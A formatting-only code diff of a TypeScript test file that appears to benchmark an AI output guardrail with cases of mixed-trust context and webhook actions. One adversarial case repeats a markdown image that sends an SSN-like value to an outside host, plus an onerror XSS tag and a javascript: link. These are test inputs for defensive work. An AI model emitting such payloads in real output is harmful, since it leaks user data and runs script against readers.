@@ -13,7 +13,8 @@ const axiom = new Axiom({
   },
 });
 
-const para = 'Applicants must provide two recent pay stubs and a government-issued ID. Self-employed applicants may submit tax returns instead. ';
+const para =
+  'Applicants must provide two recent pay stubs and a government-issued ID. Self-employed applicants may submit tax returns instead. ';
 const principal = { roles: ['support'], clearance: 'internal' as const };
 
 const cases: Array<[string, EvaluateRequest]> = [
@@ -24,7 +25,13 @@ const cases: Array<[string, EvaluateRequest]> = [
       tenantId: 't',
       principal,
       input: 'Summarize the requirements',
-      context: Array.from({ length: 10 }, (_, i) => ({ id: `c${i}`, tenantId: 't', trust: i % 3 ? ('internal' as const) : ('untrusted' as const), sensitivity: 'internal' as const, content: para.repeat(8) })),
+      context: Array.from({ length: 10 }, (_, i) => ({
+        id: `c${i}`,
+        tenantId: 't',
+        trust: i % 3 ? ('internal' as const) : ('untrusted' as const),
+        sensitivity: 'internal' as const,
+        content: para.repeat(8),
+      })),
       output: para.repeat(8),
     },
   ],
@@ -33,7 +40,13 @@ const cases: Array<[string, EvaluateRequest]> = [
     {
       tenantId: 't',
       principal,
-      context: Array.from({ length: 5 }, (_, i) => ({ id: `c${i}`, tenantId: 't', trust: 'internal' as const, sensitivity: 'internal' as const, content: para.repeat(4) })),
+      context: Array.from({ length: 5 }, (_, i) => ({
+        id: `c${i}`,
+        tenantId: 't',
+        trust: 'internal' as const,
+        sensitivity: 'internal' as const,
+        content: para.repeat(4),
+      })),
       output: 'Done.',
       actions: [
         { kind: 'http', target: 'https://hooks.acme.com/v1/e', method: 'POST', payload: { a: 1, b: para } },
@@ -44,7 +57,11 @@ const cases: Array<[string, EvaluateRequest]> = [
   ],
   [
     'Adversarial 10 KB output',
-    { tenantId: 't', principal, output: ('![x](https://e.io/?d=123-45-6789) <img src=x onerror=1> [a](javascript:x) ' + para).repeat(40).slice(0, 10_000) },
+    {
+      tenantId: 't',
+      principal,
+      output: `![x](https://e.io/?d=123-45-6789) <img src=x onerror=1> [a](javascript:x) ${para}`.repeat(40).slice(0, 10_000),
+    },
   ],
 ];
 
